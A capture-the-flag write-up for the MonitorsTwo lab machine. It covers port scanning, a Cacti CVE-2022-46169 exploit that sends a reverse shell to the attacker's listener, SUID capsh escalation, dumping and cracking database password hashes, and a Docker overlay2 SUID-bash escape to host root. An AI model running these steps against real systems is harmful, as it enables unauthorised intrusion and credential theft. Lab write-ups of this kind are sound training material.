

![1](</Writeups/Machines/MonitorsTwoo/img/logo.png>)
By Rug4lo

## Reconnaissance

We start with the usual nmap scan
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.211
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-26 20:13 CEST
Initiating SYN Stealth Scan at 20:13
Scanning 10.10.11.211 [65535 ports]
Discovered open port 80/tcp on 10.10.11.211
Discovered open port 22/tcp on 10.10.11.211
Completed SYN Stealth Scan at 20:13, 13.76s elapsed (65535 total ports)
Nmap scan report for 10.10.11.211
Host is up, received user-set (0.11s latency).
Scanned at 2023-08-26 20:13:03 CEST for 14s
Not shown: 65121 closed tcp ports (reset), 412 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
           Raw packets sent: 68247 (3.003MB) | Rcvd: 66661 (2.666MB)
```
Then we run a scan with the basic reconnaissance scripts 
```bash
nmap -sCV -p22,80 -oN targeted 10.10.11.211 
```
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-26 20:16 CEST
Nmap scan report for cacti.htb (10.10.11.211)
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds
```

Now we can head to the website on port 80

![1](</Writeups/Machines/MonitorsTwoo/img/1.png>)

## Exploiting the web application

We can try an SQLi but we'll see that it doesn't work

But in this panel we can see the version, so we can look for vulnerabilities affecting this version of cacti

While searching I found this project, which abuses a vulnerability in this version of cacti to send you a reverse shell

**Project** ---> https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/tree/main

Using this we'll be able to get an interactive shell on the machine

First of all we set up a listener on whichever port we want 
```bash
nc -nlvp 4646
```
Then we run the .py tool, passing it our ip, the port it should send the shell back to, and the ip of the machine
```bash
python3 CVE-2022-46169.py  -u http://10.10.11.211 --LHOST=10.10.14.89 --LPORT=4646
```
```bash
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```
Now we have shell access, but if we run whoami we can see that we are inside a Docker container
```bash
whoami
```
```bash
www-data
```

## Privilege escalation inside the docker container

Now we look for a way to escalate privileges, 
```bash
find / -perm -4000 2>/dev/null
```
We find a binary called capsh, which we can use to become root, like this:
```bash
capsh --gid=0 --uid=0 --
```

## Exploiting the database

Once we are root let's go to the filesystem root and cat the **entrypoint.sh** file

This will show us how to get into the server's database
```bash
mysql --host=db --user=root --password=root cacti
```
Using this command we go straight into the cacti database, so there's no need to list databases

Now we can list the tables 
```bash
 MySQL [(cacti)]> show tables;
```
The one we're interested in is user_auth 

If we look at its contents we'll get the user's password for ssh (root's won't work)
```bash
  MySQL [cacti]> select username, password from user_auth;
```
```bash
  +----------+--------------------------------------------------------------+
  | username | password                                                     |
  +----------+--------------------------------------------------------------+
  | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
  | guest    | 43e9a4ab75570f5b                                             |
  | marcus   | $2y$10$vcrYth5Y.contraseña                                   |
  +----------+--------------------------------------------------------------+
```
Now with john we can crack the hash (the hash file has to contain marcus's hash)
```bash
john --wordlist=/opt/rockyou.txt hash
```

## Privilege escalation on the host machine

Now we can connect as the user marcus over ssh, but don't close the docker shell, we'll need it later

Now that we are the user marcus we can read the user flag, which will be in the home directory 

![1](</Writeups/Machines/MonitorsTwoo/img/2.png>)


Great, now it's time to go after the root flag. For that we'll need to escalate privileges, but there's no obvious way at first glance

That's why we'll use the root shell we have in the docker container and set the SUID bit on bash
```bash
chmod u+s /bin/bash 
```
But we've set the permissions on the container's bash, not the host machine's

So, as the user Marcus, we have to go to this path 
```bash
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
```
And once we're there we run bash
```bash
bin/bash -p
```
This will give us a shell as root

Now all that's left is to go to the root folder and read the flag 